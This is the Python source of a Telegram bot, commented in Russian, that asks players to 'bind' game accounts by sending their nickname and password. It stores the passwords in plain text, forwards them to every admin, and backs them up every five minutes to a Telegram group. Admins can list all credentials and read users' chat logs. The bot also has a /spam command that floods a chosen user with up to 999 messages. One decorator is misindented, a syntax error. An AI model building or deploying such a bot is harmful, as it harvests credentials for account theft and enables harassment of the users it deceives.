import asyncio
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import os
import re
import threading
import time
import psutil

from aiogram import BaseMiddleware, Bot, Dispatcher, types, F
from aiogram.exceptions import TelegramRetryAfter
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery

# ==========================================
# ВЕБ-СЕРВЕР ДЛЯ RENDER И UPTIMEROBOT
# ==========================================
class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot is active")

    def log_message(self, format, *args):
        return

def run_health_check_server():
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(("0.0.0.0", port), HealthCheckHandler)
    server.serve_forever()

threading.Thread(target=run_health_check_server, daemon=True).start()

# ==========================================
# ОСНОВНЫЕ НАСТРОЙКИ
# ==========================================
BOT_TOKEN = os.getenv("BOT_TOKEN")
MAIN_ADMIN_ID = 8070071877  # Главный админ
BACKUP_GROUP_ID = -1004497972901  # Группа для бэкапов

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

LOCAL_DB_FILE = "bot_data.json"

def load_data():
    if os.path.exists(LOCAL_DB_FILE):
        try:
            with open(LOCAL_DB_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception as e:
            print(f"Ошибка чтения локальной базы: {e}")
    return {
        "admins": [MAIN_ADMIN_ID],
        "banned_users": {},
        "accounts_db": {}
    }

def save_data():
    try:
        with open(LOCAL_DB_FILE, "w", encoding="utf-8") as f:
            json.dump(db, f, ensure_ascii=False, indent=4)
    except Exception as e:
        print(f"Ошибка сохранения локальной базы: {e}")

db = load_data()

if MAIN_ADMIN_ID not in db["admins"]:
    db["admins"].append(MAIN_ADMIN_ID)
    save_data()

user_cooldowns = {}
bot_messages = {}
chat_history = {}
active_spam_tasks = {}

# ==========================================
# О Т П Р А В К А   Б Э К А П А
# ==========================================
async def send_backup_to_group():
    try:
        accounts = db.get("accounts_db", {})
        has_accounts = any(len(acc_list) > 0 for acc_list in accounts.values())

        if has_accounts:
            filename = "database_backup.json"
            with open(filename, "w", encoding="utf-8") as f:
                json.dump(db, f, ensure_ascii=False, indent=4)

            backup_file = types.FSInputFile(filename)
            await bot.send_document(
                chat_id=BACKUP_GROUP_ID,
                document=backup_file,
                caption="[Авто-бэкап базы данных]",
                disable_notification=True
            )

            if os.path.exists(filename):
                os.remove(filename)
    except Exception as e:
        print(f"Ошибка отправки бэкапа в группу: {e}")

async def auto_backup_task():
    while True:
        await asyncio.sleep(300)
        await send_backup_to_group()

# ==========================================
# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ И MIDDLEWARE
# ==========================================
def log_chat(user_id: int, sender: str, text: str):
    if user_id not in chat_history:
        chat_history[user_id] = []
    chat_history[user_id].append(f"[{sender}]: {text}")
    if len(chat_history[user_id]) > 100:
        chat_history[user_id].pop(0)

async def send_tracked_message(chat_id: int, text: str):
    try:
        msg = await bot.send_message(chat_id, text)
        if chat_id not in bot_messages:
            bot_messages[chat_id] = []
        bot_messages[chat_id].append(msg.message_id)
        log_chat(chat_id, "Бот", text)
        return msg
    except Exception:
        return None

def is_valid_input(text: str) -> bool:
    return bool(re.match(r"^[A-Za-z0-9_]+$", text))

def is_admin(user_id: int) -> bool:
    return user_id in db["admins"] or user_id == MAIN_ADMIN_ID

class BanMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data_dict):
        user_id = event.from_user.id
        str_uid = str(user_id)
        current_time = time.time()

        if hasattr(event, 'text') and event.text:
            log_chat(user_id, "Пользователь", event.text)

        if str_uid in db["banned_users"]:
            unban_time = db["banned_users"][str_uid]
            if current_time < unban_time:
                seconds_left = int(unban_time - current_time)
                days_left = seconds_left // 86400
                minutes_left = (seconds_left % 86400) // 60
                await event.answer(f"[Система] У вас бан {days_left} дней и {minutes_left} минут.")
                return
            else:
                del db["banned_users"][str_uid]
                save_data()

        return await handler(event, data_dict)

dp.message.middleware(BanMiddleware())

# ==========================================
# ПОЛЬЗОВАТЕЛЬСКИЕ КОМАНДЫ И БД
# ==========================================
@dp.message(Command("getdb"))
async def getdb_handler(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    filename = "database.json"
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(db, f, ensure_ascii=False, indent=4)
    db_file = types.FSInputFile(filename)
    await bot.send_document(chat_id=message.chat.id, document=db_file, caption="[БД] Текущий файл базы данных.")
    if os.path.exists(filename):
        os.remove(filename)

@dp.message(F.document)
async def restore_db_handler(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    document = message.document
    if not document.file_name.endswith(".json"):
        return
    file_path = f"downloaded_{document.file_name}"
    try:
        file = await bot.get_file(document.file_id)
        await bot.download_file(file.file_path, file_path)
        with open(file_path, "r", encoding="utf-8") as f:
            imported_data = json.load(f)
        if isinstance(imported_data, dict) and "accounts_db" in imported_data:
            global db
            db.clear()
            db.update(imported_data)
            save_data()
            await bot.send_message(message.chat.id, "[БД] База данных успешно восстановлена!")
        else:
            await bot.send_message(message.chat.id, "[БД] Ошибка: Неверный формат файла базы данных.")
    except Exception as e:
        await bot.send_message(message.chat.id, f"[БД] Ошибка восстановления: {e}")
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

@dp.message(Command("start"))
async def start_handler(message: types.Message):
    welcome_text = (
        "[Бот] Для того, чтобы привязать игровой аккаунт, выполните следующие действия:\n"
        "1. Напишите: /bind [Ваш-Ник] [Ваш-Пароль]\n"
        "2. Напишите /help, чтобы увидеть возможности.\n"
        "3. Жалобы: /report [текст]"
    )
    await send_tracked_message(message.chat.id, welcome_text)

@dp.message(Command("help"))
async def help_handler(message: types.Message):
    help_text = (
        "Список доступных команд:\n\n"
        "/bind [Ник] [Пароль] - Привязать игровой аккаунт.\n"
        "/list - Показать привязанные аккаунты.\n"
        "/report [текст] - Отправить жалобу.\n"
        "/help - Показать это меню."
    )
    await send_tracked_message(message.chat.id, help_text)

@dp.message(Command("bind"))
async def bind_handler(message: types.Message):
    user_id = message.from_user.id
    current_time = time.time()

    if user_id in user_cooldowns:
        elapsed = current_time - user_cooldowns[user_id]
        if elapsed < 15:
            remaining = int(15 - elapsed)
            for sec in range(remaining, 0, -1):
                try:
                    timer_msg = await bot.send_message(user_id, f"[Система] До следующей попытки {sec} секунд.")
                    await asyncio.sleep(1)
                    await timer_msg.delete()
                except Exception:
                    pass
            return

    args = message.text.split()
    if len(args) != 3:
        await send_tracked_message(user_id, "[Бот] Неверный формат. Используйте: /bind [Ник] [Пароль]")
        return

    username = args[1]
    password = args[2]

    if not is_valid_input(username) or not is_valid_input(password):
        await send_tracked_message(user_id, "[Бот] Неверный пароль или ник.")
        return

    for uid, accs in db["accounts_db"].items():
        for acc in accs:
            if acc["nick"].lower() == username.lower():
                await send_tracked_message(user_id, "[Бот] Этот аккаунт уже привязан.")
                return

    user_cooldowns[user_id] = current_time
    str_uid = str(user_id)
    if str_uid not in db["accounts_db"]:
        db["accounts_db"][str_uid] = []

    db["accounts_db"][str_uid].append({"nick": username, "password": password})
    save_data()
    await send_tracked_message(user_id, "[Бот] Запрос отправлен на проверку администраторам.")

    tg_user = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
    admin_msg = (
        f"[Уведомление] Новый запрос на привязку:\n\n"
        f"Игрок: {tg_user}\n"
        f"Telegram ID: {user_id}\n"
        f"Ник: {username}\n"
        f"Пароль: {password}"
    )

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="❌ Неверный пароль", callback_data=f"bind_wrong_pass:{user_id}:{username}")],
            [InlineKeyboardButton(text="❓ Такого ника не существует", callback_data=f"bind_no_nick:{user_id}:{username}")],
            [InlineKeyboardButton(text="✅ Привязка прошла успешно", callback_data=f"bind_success:{user_id}:{username}")]
        ]
    )

    for admin_id in db.get("admins", []):
        try:
            await bot.send_message(chat_id=admin_id, text=admin_msg, reply_markup=keyboard)
        except Exception as e:
            print(f"Не удалось отправить уведомление админу {admin_id}: {e}")

    await send_backup_to_group()
        @dp.callback_query(F.data.startswith("bind_"))
async def process_bind_callback(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("У вас нет прав администратора!", show_alert=True)
        return

    data_parts = callback.data.split(":")
    action = data_parts[0]
    target_user_id = int(data_parts[1])
    target_nick = data_parts[2]

    str_uid = str(target_user_id)

    if action == "bind_wrong_pass":
        if str_uid in db["accounts_db"]:
            db["accounts_db"][str_uid] = [acc for acc in db["accounts_db"][str_uid] if acc["nick"].lower() != target_nick.lower()]
            save_data()
        await send_tracked_message(target_user_id, f"[Бот] Отклонено: Неверный пароль для аккаунта {target_nick}.")
        status_text = f"❌ Отклонено (Неверный пароль) администратором {callback.from_user.first_name}"

    elif action == "bind_no_nick":
        if str_uid in db["accounts_db"]:
            db["accounts_db"][str_uid] = [acc for acc in db["accounts_db"][str_uid] if acc["nick"].lower() != target_nick.lower()]
            save_data()
        await send_tracked_message(target_user_id, f"[Бот] Отклонено: Такого ника ({target_nick}) не существует.")
        status_text = f"❓ Отклонено (Ник не существует) администратором {callback.from_user.first_name}"

    elif action == "bind_success":
        await send_tracked_message(target_user_id, f"[Бот] Аккаунт {target_nick} успешно привязан!")
        status_text = f"✅ Привязка прошла успешно (Подтвердил: {callback.from_user.first_name})"

    await callback.message.edit_text(
        f"{callback.message.text}\n\n-------------------\nСтатус: {status_text}",
        reply_markup=None
    )
    await callback.answer("Статус обновлен и отправлен игроку!")

@dp.message(Command("list"))
async def list_handler(message: types.Message):
    user_id = message.from_user.id
    str_uid = str(user_id)
    if str_uid not in db["accounts_db"] or not db["accounts_db"][str_uid]:
        await send_tracked_message(user_id, "[Бот] У вас нет привязанных аккаунтов.")
        return

    text = "[Бот] Ваши привязанные аккаунты:\n\n"
    for acc in db["accounts_db"][str_uid]:
        text += f"Ник: {acc['nick']} | Пароль: {acc['password']}\n"
    await send_tracked_message(user_id, text)

@dp.message(Command("report"))
async def report_handler(message: types.Message):
    text = message.text[7:].strip()
    if not text:
        await send_tracked_message(message.chat.id, "[Система] Пример: /report Нашел баг")
        return

    user_id = message.from_user.id
    tg_user = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
    report_msg = f"[ЖАЛОБА/РЕПОРТ]\nОт пользователя: {tg_user}\nID: {user_id}\nТекст: {text}"

    try:
        await bot.send_message(MAIN_ADMIN_ID, report_msg)
        await send_tracked_message(message.chat.id, "[Система] Ваша жалоба отправлена.")
    except Exception:
        await send_tracked_message(message.chat.id, "[Система] Ошибка при отправке.")

# ==========================================
# АДМИН-КОМАНДЫ И ЗАПУСК
# ==========================================
@dp.message(Command("antispam"))
async def antispam_handler(message: types.Message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        return

    if user_id in active_spam_tasks and active_spam_tasks[user_id]:
        active_spam_tasks[user_id] = False
        await send_tracked_message(user_id, "[Антиспам] Спам-атака в ваш адрес успешно остановлена!")
    else:
        await send_tracked_message(user_id, "[Антиспам] В ваш адрес сейчас спам не идет.")

@dp.message(Command("helpadmin"))
async def helpadmin_handler(message: types.Message):
    if not is_admin(message.from_user.id):
        return

    text = (
        "[ПАНЕЛЬ АДМИНИСТРАТОРА]\n\n"
        "Пользовательские:\n"
        "/bind [Ник] [Пароль]\n"
        "/list\n"
        "/report [текст]\n\n"
        "Админские:\n"
        "/getdb - Скачать текущий файл базы (.json)\n"
        "(Отправь .json файл боту для восстановления базы)\n"
        "/op [ID] - Выдать админку\n"
        "/deop [ID] - Снять админку\n"
        "/servers - Статус сервера\n"
        "/ban [ID] [дней] - Забанить\n"
        "/unban [ID] - Разбанить\n"
        "/spam [ID] (.текст.) [кол-во] - Запустить спам\n"
        "/antispam - Остановить спам в свою личку\n"
        "/msg [ID] [текст] - Ответить игроку\n"
        "/listadmin - Список всех аккаунтов\n"
        "/dellist [Ник] - Удалить аккаунт по нику\n"
        "/ls [ID] - Переписка с пользователем\n"
        "/clear [ID] - Удалить сообщения бота у юзера"
    )
    await bot.send_message(message.chat.id, text)

@dp.message(Command("ls"))
async def ls_handler(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) < 2:
        await bot.send_message(message.chat.id, "[Система] Используйте: /ls [ID_пользователя]")
        return

    target_id = int(args[1])
    if target_id not in chat_history or not chat_history[target_id]:
        await bot.send_message(message.chat.id, f"[Система] История сообщений с {target_id} пуста.")
        return

    history_text = f"[История диалога с {target_id}]:\n\n" + "\n".join(chat_history[target_id])

    if len(history_text) > 3500:
        for i in range(0, len(history_text), 3500):
            await bot.send_message(message.chat.id, history_text[i:i+3500])
    else:
        await bot.send_message(message.chat.id, history_text)

@dp.message(Command("listadmin"))
async def listadmin_handler(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    if not db["accounts_db"]:
        await bot.send_message(message.chat.id, "[Система] База данных аккаунтов пуста.")
        return

    text = "<b>[Система] Все привязанные аккаунты:</b>\n\n"
    for uid, accs in db["accounts_db"].items():
        for acc in accs:
            text += f"ID: <code>{uid}</code> | Ник: <code>{acc['nick']}</code> | Пароль: <code>{acc['password']}</code>\n"

    if len(text) > 3500:
        chunks = [text[i:i+3500] for i in range(0, len(text), 3500)]
        for chunk in chunks:
            await bot.send_message(message.chat.id, chunk, parse_mode="HTML")
            await asyncio.sleep(0.3)
    else:
        await bot.send_message(message.chat.id, text, parse_mode="HTML")

@dp.message(Command("spam"))
async def spam_handler(message: types.Message):
    if not is_admin(message.from_user.id):
        return

    pattern = r"/spam\s+(\d+)\s+\(\.(.*?)\.\)\s+(\d+)"
    match = re.search(pattern, message.text, re.DOTALL)

    if not match:
        await bot.send_message(message.chat.id, "[Система] Формат: /spam [ID] (.Текст.) [Кол-во]")
        return

    target_id = int(match.group(1))
    spam_text = match.group(2)
    count = min(int(match.group(3)), 999)

    if target_id == MAIN_ADMIN_ID:
        await bot.send_message(message.chat.id, "[Система] Запрещено отправлять спам Главному Администратору!")
        return

    active_spam_tasks[target_id] = True

    report_msg = await bot.send_message(
        message.chat.id,
        f"[Спам Запуск]\nОтправка пользователю {target_id}\nПрогресс: 0/{count}"
    )

    sent_count = 0
    for i in range(1, count + 1):
        if not active_spam_tasks.get(target_id, True):
            await bot.send_message(message.chat.id, f"[Спам Прерван] Пользователь {target_id} остановил спам через /antispam.")
            break

        try:
            await send_tracked_message(target_id, spam_text)
            sent_count += 1
            await asyncio.sleep(0.1)

            if i % 25 == 0 or i == count:
                try:
                    await bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=report_msg.message_id,
                        text=f"[Спам Отчет]\nПользователь: {target_id}\nОтправлено: {sent_count}/{count}"
                    )
                except Exception:
                    pass
        except TelegramRetryAfter as e:
            await asyncio.sleep(e.retry_after)
        except Exception as e:
            await bot.send_message(message.chat.id, f"[Спам Ошибка] Остановлено на {sent_count}/{count}. Ошибка: {e}")
            break

    active_spam_tasks[target_id] = False

@dp.message(Command("ban"))
async def ban_handler(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) < 3:
        await bot.send_message(message.chat.id, "[Система] Пример: /ban 123456789 7")
        return

    target_id = int(args[1])
    days = int(args[2])

    if target_id == MAIN_ADMIN_ID:
        await bot.send_message(message.chat.id, "[Система] Нельзя забанить Главного Админа.")
        return

    unban_time = time.time() + (days * 86400)
    db["banned_users"][str(target_id)] = unban_time
    save_data()

    try:
        await bot.send_message(target_id, f"[Система] Вы заблокированы администратором на {days} дней.")
    except Exception:
        pass

    await bot.send_message(message.chat.id, f"[Система] Пользователь {target_id} заблокирован на {days} дней.")

@dp.message(Command("op"))
async def op_handler(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) < 2:
        return
    target_id = int(args[1])
    if target_id not in db["admins"]:
        db["admins"].append(target_id)
        save_data()
        await bot.send_message(message.chat.id, f"[Система] Пользователю {target_id} выдана админка.")

@dp.message(Command("deop"))
async def deop_handler(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) < 2:
        return
    target_id = int(args[1])
    if target_id == MAIN_ADMIN_ID:
        return await bot.send_message(message.chat.id, "[Система] Нельзя забрать админку у Главного.")
    if target_id in db["admins"]:
        db["admins"].remove(target_id)
        save_data()
        await bot.send_message(message.chat.id, f"[Система] С пользователя {target_id} снята админка.")

@dp.message(Command("servers", "server"))
async def servers_handler(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    process = psutil.Process(os.getpid())
    cpu_usage = process.cpu_percent(interval=0.5)
    ram_used_mb = round(process.memory_info().rss / (1024 * 1024), 1)
    stats_text = (
        "[Статус Бот-Процесса]\n\n"
        f"Загрузка ЦП (CPU): {cpu_usage}%\n"
        f"Использование ОЗУ (RAM): {ram_used_mb} MB\n"
        f"Статус веб-сервера: Активен (24/7)"
    )
    await bot.send_message(message.chat.id, stats_text)

@dp.message(Command("unban"))
async def unban_handler(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) < 2:
        return
    target_id = str(args[1])
    if target_id in db["banned_users"]:
        del db["banned_users"][target_id]
        save_data()
        await bot.send_message(message.chat.id, f"[Система] Пользователь {target_id} разблокирован.")

@dp.message(Command("msg"))
async def msg_handler(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split(maxsplit=2)
    if len(args) < 3:
        return
    target_id = int(args[1])
    text = args[2]
    try:
        await send_tracked_message(target_id, f"[Ответ от администрации]\n{text}")
        await bot.send_message(message.chat.id, "[Система] Сообщение отправлено.")
    except Exception:
        await bot.send_message(message.chat.id, "[Система] Ошибка отправки.")

@dp.message(Command("dellist"))
async def dellist_handler(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) < 2:
        return
    target_nick = args[1]
    found = False
    for uid, accs in db["accounts_db"].items():
        for acc in accs[:]:
            if acc["nick"].lower() == target_nick.lower():
                accs.remove(acc)
                found = True

    if found:
        save_data()
        await bot.send_message(message.chat.id, f"[Система] Аккаунт {target_nick} удален из базы.")
    else:
        await bot.send_message(message.chat.id, "[Система] Ник не найден.")

@dp.message(Command("clear"))
async def clear_handler(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) < 2:
        return
    target_id = int(args[1])
    if target_id in bot_messages and bot_messages[target_id]:
        deleted_count = 0
        for msg_id in bot_messages[target_id]:
            try:
                await bot.delete_message(chat_id=target_id, message_id=msg_id)
                deleted_count += 1
            except Exception:
                pass
        bot_messages[target_id].clear()
        await bot.send_message(message.chat.id, f"[Система] Удалено {deleted_count} сообщений у {target_id}.")

# ==========================================
# ЗАПУСК БОТА И ФОНОВЫХ ЗАДАЧ
# ==========================================
async def main():
    await bot.delete_webhook(drop_pending_updates=True)

    try:
        await bot.send_message(
            chat_id=BACKUP_GROUP_ID,
            text="[Система] Бот успешно запущен и привязан к группе бэкапов!"
        )
    except Exception as e:
        print(f"Ошибка отправки сообщений в группу бэкапов: {e}")

    await send_backup_to_group()
    asyncio.create_task(auto_backup_task())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())

